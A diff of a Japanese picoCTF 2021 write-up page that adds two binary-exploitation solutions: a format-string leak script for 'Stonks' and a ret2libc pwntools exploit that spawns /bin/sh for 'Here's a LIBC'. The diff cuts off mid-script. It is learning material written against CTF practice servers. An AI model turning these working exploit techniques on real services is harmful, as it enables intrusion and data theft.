@@ -16,7 +16,7 @@
 <meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
 
 
-<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="URL: https://play.picoctf.org/events/34 お詫び： どうやら、Winnerが決まるまでWriteupはPublishしてはいけなかったみたいですね。正直、知らなくてフライングしまし" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="(2021/05/30 - Pwn (Binary) を少し復習しました。下の方に追記してます。) URL: https://play.picoctf.org/practice お詫び： どうやら、Winnerが決まるまでWriteupはPublishしてはいけな" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
 
 
 
@@ -40,22 +40,22 @@
 
 
 <meta property="og:title" content="picoCTF 2021 Writeup" />
-<meta property="og:description" content="URL: https://play.picoctf.org/events/34 お詫び： どうやら、Winnerが決まるまでWriteupはPublishしてはいけなかったみたいですね。正直、知らなくてフライングしまし" />
+<meta property="og:description" content="(2021/05/30 - Pwn (Binary) を少し復習しました。下の方に追記してます。) URL: https://play.picoctf.org/practice お詫び： どうやら、Winnerが決まるまでWriteupはPublishしてはいけな" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://captureamerica.github.io/writeups/post/picoctf_2021/" />
 <meta property="article:published_time" content="2021-04-10T19:00:00+09:00" />
 <meta property="article:modified_time" content="2021-04-10T19:00:00+09:00" />
 <meta itemprop="name" content="picoCTF 2021 Writeup">
-<meta itemprop="description" content="URL: https://play.picoctf.org/events/34 お詫び： どうやら、Winnerが決まるまでWriteupはPublishしてはいけなかったみたいですね。正直、知らなくてフライングしまし">
+<meta itemprop="description" content="(2021/05/30 - Pwn (Binary) を少し復習しました。下の方に追記してます。) URL: https://play.picoctf.org/practice お詫び： どうやら、Winnerが決まるまでWriteupはPublishしてはいけな">
 <meta itemprop="datePublished" content="2021-04-10T19:00:00&#43;09:00" />
 <meta itemprop="dateModified" content="2021-04-10T19:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="5027">
+<meta itemprop="wordCount" content="6334">
 
 
 
-<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="CTF,Reviewed," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="picoCTF 2021 Writeup"/>
-<meta name="twitter:description" content="URL: https://play.picoctf.org/events/34 お詫び： どうやら、Winnerが決まるまでWriteupはPublishしてはいけなかったみたいですね。正直、知らなくてフライングしまし"/>
+<meta name="twitter:description" content="(2021/05/30 - Pwn (Binary) を少し復習しました。下の方に追記してます。) URL: https://play.picoctf.org/practice お詫び： どうやら、Winnerが決まるまでWriteupはPublishしてはいけな"/>
 
 <!--[if lte IE 9]>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
@@ -288,6 +288,18 @@
         <li><a href="#solution-24">Solution</a></li>
       </ul>
     </li>
+    <li><a href="#binary-stonks-20-points">[Binary]: Stonks (20 points)</a>
+      <ul>
+        <li><a href="#challenge-25">Challenge</a></li>
+        <li><a href="#solution-25">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-heres-a-libc-90-points">[Binary]: Here&rsquo;s a LIBC (90 points)</a>
+      <ul>
+        <li><a href="#challenge-26">Challenge</a></li>
+        <li><a href="#solution-26">Solution</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -298,7 +310,8 @@
 <img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
 </a>
 </div>
-<p>URL: <a href="https://play.picoctf.org/events/34">https://play.picoctf.org/events/34</a></p>
+<p>(2021/05/30 - Pwn (Binary) を少し復習しました。下の方に追記してます。)</p>
+<p>URL: <a href="https://play.picoctf.org/practice">https://play.picoctf.org/practice</a></p>
 <table><tr><td>
 お詫び：
 <p>どうやら、Winnerが決まるまでWriteupはPublishしてはいけなかったみたいですね。正直、知らなくてフライングしました。スミマセン。。</p>
@@ -312,19 +325,25 @@
 <p>ここ3ヶ月間、プライベートの方が忙しくて全くCTFできていなかった割には、まぁまぁできた方かなと思います。</p>
 <p><br /></p>
 <p>以下が解いたチャレンジの状況です。Binaryがほとんど手付かずでした。</p>
-<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_web.png" alt="picoctf_2021_web.png">
+<p>[Web] <br />
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_web.png" alt="picoctf_2021_web.png"></p>
 <p><br /></p>
-<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_crypto1.png" alt="picoctf_2021_crypto1.png">
+<p>[Crypto] <br />
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_crypto1.png" alt="picoctf_2021_crypto1.png"></p>
 <p><br /></p>
 <img src="https://captureamerica.github.io/writeups/img/picoctf_2021_crypto2.png" alt="picoctf_2021_crypto2.png">
 <p><br /></p>
-<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_rev.png" alt="picoctf_2021_rev.png">
+<p>[Reverse] <br />
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_rev.png" alt="picoctf_2021_rev.png"></p>
 <p><br /></p>
-<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_forensic.png" alt="picoctf_2021_forensic.png">
+<p>[Forensics] <br />
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_forensic.png" alt="picoctf_2021_forensic.png"></p>
 <p><br /></p>
-<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_general.png" alt="picoctf_2021_general.png">
+<p>[General Skills] <br />
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_general.png" alt="picoctf_2021_general.png"></p>
 <p><br /></p>
-<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_binary.png" alt="picoctf_2021_binary.png">
+<p>[Binary] <br />
+<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_binary.png" alt="picoctf_2021_binary.png"></p>
 <p><br /><br /></p>
 <h2 id="web-ancient-history-10-points">[Web]: Ancient History (10 points)</h2>
 <hr>
@@ -1769,6 +1788,479 @@ Hint: What version of python am I running?</p>
 <p><br /></p>
 <p>Flag: <code>picoCTF{v4lua4bl3_1npu7_7607377}</code></p>
 <p><br /><br />
+<br /><br />
+<img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
+<br />
+ここから下はイベント終了後に行った復習です。</p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="binary-stonks-20-points">[Binary]: Stonks (20 points)</h2>
+<hr>
+<h3 id="challenge-25">Challenge</h3>
+<blockquote>
+<p>I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn&rsquo;t believe you if you told me it&rsquo;s unsecure!
+<br /><br />
+Hint: Okay, maybe I&rsquo;d believe you if you find my API key.</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>vuln.c</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-25">Solution</h3>
+<p>malloc()とかfree()とかあったので、double-freeとかそこら辺かと思ってスルーしてたんですけど、書式文字列攻撃（Format string bug）でしたね。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="hl"><span class="lnt">32
+</span></span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">buy_stonks</span><span class="p">(</span><span class="n">Portfolio</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="kt">char</span> <span class="n">api_buf</span><span class="p">[</span><span class="n">FLAG_BUFFER</span><span class="p">];</span>
+	<span class="n">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;api&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">f</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Flag file not found. Contact an admin.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">fgets</span><span class="p">(</span><span class="n">api_buf</span><span class="p">,</span> <span class="n">FLAG_BUFFER</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
+
+	<span class="kt">int</span> <span class="n">money</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">money</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">shares</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">Stonk</span> <span class="o">*</span><span class="n">temp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Using patented AI algorithms to buy stonks</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+	<span class="k">while</span> <span class="p">(</span><span class="n">money</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">shares</span> <span class="o">=</span> <span class="p">(</span><span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="n">money</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+		<span class="n">temp</span> <span class="o">=</span> <span class="n">pick_symbol_with_AI</span><span class="p">(</span><span class="n">shares</span><span class="p">);</span>
+		<span class="n">temp</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">;</span>
+		<span class="n">p</span><span class="o">-&gt;</span><span class="n">head</span> <span class="o">=</span> <span class="n">temp</span><span class="p">;</span>
+		<span class="n">money</span> <span class="o">-=</span> <span class="n">shares</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stonks chosen</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="c1">// TODO: Figure out how to read token from file, for now just ask
+</span><span class="c1"></span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">user_buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">300</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;What is your API token?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%300s&#34;</span><span class="p">,</span> <span class="n">user_buf</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Buying stonks with token:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="hl">	<span class="n">printf</span><span class="p">(</span><span class="n">user_buf</span><span class="p">);</span>
+</span>
+	<span class="c1">// TODO: Actually use key to interact with API
+</span><span class="c1"></span>
+	<span class="n">view_portfolio</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
+
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br /></p>
+<p>まずは、繋いでみて動作を確認します。</p>
+<pre>
+$ nc mercury.picoctf.net 53437
+Welcome back to the trading app!
+
+What would you like to do?
+1) Buy some stonks!
+2) View my portfolio
+1
+Using patented AI algorithms to buy stonks
+Stonks chosen
+What is your API token?
+AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+Buying stonks with token:
+AAAA0x9c62450.0x804b000.0x80489c3.0xf7fadd80.0xffffffff.0x1.0x9c60160.0xf7fbb110.0xf7faddc7.(nil).0x9c61180.0x1.0x9c62430.0x9c62450.0x6f636970.0x7b465443.0x306c5f49.0x345f7435.0x6d5f6c6c.0x306d5f79.0x5f79336e.0x34636462.0x61653532.0xffd5007d.0xf7fe8af8.0xf7fbb440.0x70bab900.0x1.(nil).0xf7e4abe9.0xf7fbc0c0.0xf7fad5c0.0xf7fad000.0xffd54508.0xf7e3b58d.0xf7fad5c0.0x8048eca
+Portfolio as of Sun May 30 02:45:13 UTC 2021
+</pre>
+<p><br /></p>
+<p>書いたコード：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding:utf-8 -*-</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
+
+<span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s1">&#39;mercury.picoctf.net&#39;</span><span class="p">,</span> <span class="mi">53437</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span><span class="mi">25</span><span class="p">):</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;2) View my portfolio&#39;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;What is your API token?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;$p&#39;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Buying stonks with token:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s2">&#34;0x&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span> <span class="c1"># To remove &#39;\n&#39;</span>
+            <span class="c1"># print(r)</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="mi">16</span><span class="p">)))</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;{}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">))</span>
+        <span class="k">pass</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="k">print</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br />
+実行結果：</p>
+<pre>
+$ ./stonks_solve.py
+picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}\x00\xff()
+</pre>
+<p><br /></p>
+<p>Flag: <code>picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="binary-heres-a-libc-90-points">[Binary]: Here&rsquo;s a LIBC (90 points)</h2>
+<hr>
+<h3 id="challenge-26">Challenge</h3>
+<blockquote>
+<p>I am once again asking for you to pwn this binary.
+<br /><br />
+Hint: PWNTools has a lot of useful features for getting offsets.</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>vuln (ELF 64bit)</li>
+<li>libc.so.6</li>
+<li>Makefile</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-26">Solution</h3>
+<p>まずは、Ghidraでコードを確認します。</p>
+<p>main() では大したことをやっていないので、省略します。以下の do_stuff() がキーになる箇所です。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">do_stuff</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">cVar1</span><span class="p">;</span>
+  <span class="n">undefined</span> <span class="n">local_89</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">local_88</span> <span class="p">[</span><span class="mi">112</span><span class="p">];</span>
+  <span class="n">undefined8</span> <span class="n">local_18</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_18</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%[^</span><span class="se">\n</span><span class="s">]&#34;</span><span class="p">,</span><span class="n">local_88</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0040093a</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_89</span><span class="p">);</span>
+  <span class="n">local_10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">cVar1</span> <span class="o">=</span> <span class="n">convert_case</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">local_88</span><span class="p">[</span><span class="n">local_10</span><span class="p">],</span><span class="n">local_10</span><span class="p">,</span><span class="n">local_10</span><span class="p">);</span>
+    <span class="n">local_88</span><span class="p">[</span><span class="n">local_10</span><span class="p">]</span> <span class="o">=</span> <span class="n">cVar1</span><span class="p">;</span>
+    <span class="n">local_10</span> <span class="o">=</span> <span class="n">local_10</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">puts</span><span class="p">(</span><span class="n">local_88</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br />
+checksecも確認。</p>
+<pre>
+$ checksec vuln
+[*] '/home/captureamerica/OneDrive/CTF/picoCTF_2021/Binary/Heres_a_libc/vuln'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RUNPATH:  './'
+</pre>
+<p><br />
+実際に繋いでみて、動作確認。入力した文字列を所々大文字にして表示するようです。</p>
+<pre>
+$ nc mercury.picoctf.net 49464
+WeLcOmE To mY EcHo sErVeR!
+hoge
+HoGe
+fuga
+FuGa
+</pre>
+<p><br />
+まずはオフセットをゲットしようと思ったんですが、Kaliではもらったバイナリが動きませんでした。</p>
+<pre>
+$ ./vuln
+Segmentation fault
+</pre>
+<p>ということで、gdbも当然うごかなかったです。</p>
+<p><br /></p>
+<p>ちょっとズルして、他のwriteupから136バイトなのを確認。</p>
+<p><br /></p>
+<p>書いたコード (その１)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="hl"><span class="lnt">36
+</span></span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#!/usr/bin/env python
+</span><span class="cp"># -*- coding:utf-8 -*-
+</span><span class="cp"></span>
+<span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
+<span class="nf">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="err">&#39;</span><span class="n">linux</span><span class="err">&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="err">&#39;</span><span class="n">amd64</span><span class="err">&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">critical</span><span class="err">&#39;</span>
+
+<span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">mercury</span><span class="p">.</span><span class="n">picoctf</span><span class="p">.</span><span class="n">net</span><span class="err">&#39;</span><span class="p">,</span> <span class="mi">49464</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="err">&#39;</span><span class="p">.</span><span class="o">/</span><span class="n">vuln</span><span class="err">&#39;</span><span class="p">)</span>
+
+<span class="n">ret</span> <span class="o">=</span> <span class="n">next</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="k">asm</span><span class="p">(</span><span class="err">&#39;</span><span class="n">ret</span><span class="err">&#39;</span><span class="p">)))</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">next</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="k">asm</span><span class="p">(</span><span class="err">&#39;</span><span class="n">pop</span> <span class="n">rdi</span><span class="p">;</span> <span class="n">ret</span><span class="err">&#39;</span><span class="p">)))</span>
+<span class="n">got_puts</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">&#34;puts&#34;</span><span class="p">]</span>
+<span class="n">plt_puts</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">&#34;puts&#34;</span><span class="p">]</span>
+<span class="n">addr_main</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#34;main&#34;</span><span class="p">]</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="err">&#39;</span><span class="p">.</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span><span class="err">&#39;</span><span class="p">)</span>
+<span class="n">off_puts</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#34;puts&#34;</span><span class="p">]</span>
+
+<span class="n">bufsize</span> <span class="o">=</span> <span class="mi">112</span> <span class="o">+</span> <span class="mi">24</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">&#34;A&#34;</span> <span class="o">*</span> <span class="n">bufsize</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_puts</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">plt_puts</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr_main</span><span class="p">)</span>      <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="n">main</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">&#34;WeLcOmE To mY EcHo sErVeR!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">)</span>
+
+<span class="n">libc_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#34;</span><span class="se">\x00\x00</span><span class="s">&#34;</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_puts</span> <span class="o">-</span> <span class="n">off_puts</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
+<span class="n">print</span> <span class="n">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">&#34;A&#34;</span> <span class="o">*</span> <span class="n">bufsize</span>
+<span class="hl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">b</span><span class="err">&#39;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">&#39;</span><span class="p">).</span><span class="n">next</span><span class="p">())</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">)</span>
+    
+<span class="n">s</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">&#34;WeLcOmE To mY EcHo sErVeR!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
